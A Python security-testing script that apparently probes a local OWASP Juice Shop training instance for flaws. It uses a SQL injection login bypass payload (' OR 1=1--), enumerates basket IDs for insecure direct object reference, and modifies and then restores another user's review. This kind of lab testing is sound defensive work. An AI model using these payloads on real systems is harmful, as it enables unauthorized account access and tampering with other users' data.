import requests
import os
from dotenv import load_dotenv
load_dotenv()
token = os.getenv("JUICE_SHOP_TOKEN")

def check_sql_injection():
    url = "http://localhost:3000/rest/user/login"
    payload = {
        "email": "' OR 1=1--",
        "password": "anything"
    }
    response = requests.post(url, json=payload)

    if response.status_code == 200:
        print("[VULNERABLE] SQL Injection login bypass succeeded!")
    else:
        print("[SAFE] SQL Injection attempt was blocked (status " + str(response.status_code) + ")")

def check_idor(token):
    headers = {"Authorization": "Bearer " + token}

    for basket_id in range(1, 11):
        url = "http://localhost:3000/rest/basket/" + str(basket_id)
        response = requests.get(url, headers=headers)
        data = response.json()

        if response.status_code == 200 and data.get("data") is not None:
            user_id = data["data"]["UserId"]
            print("[VULNERABLE] Basket " + str(basket_id) + " accessible, belongs to UserId " + str(user_id))
        else:
            print("[SAFE/EMPTY] Basket " + str(basket_id) + " -> status " + str(response.status_code))

def check_review_idor(token, review_id, original_message):
    headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
    url = "http://localhost:3000/rest/products/reviews"

    test_message = "[SECURITY TEST] This review was modified without authorization."
    response = requests.patch(url, headers=headers, json={"id": review_id, "message": test_message})
    result = response.json()

    if result.get("modified") == 1:
        print("[VULNERABLE] Successfully modified review " + review_id + " belonging to another user")
        
        restore = requests.patch(url, headers=headers, json={"id": review_id, "message": original_message})
        if restore.json().get("modified") == 1:
            print("[INFO] Original review content restored")
        else:
            print("[WARNING] Could not restore original content - manual cleanup needed")
        return True
    else:
        print("[SAFE] Review modification was blocked")
        return False

print("--- Checking SQL Injection ---")
check_sql_injection()

print("\n--- Checking IDOR ---")
check_idor(token)

print("\n--- Checking Review IDOR (write access) ---")
check_review_idor(token, "pxmZSb8Kebpnt3xwN", "Great! We'll have an apple party. Everyone brings an apple and - STUFFS IT DOWN EACH OTHER'S THROAT!")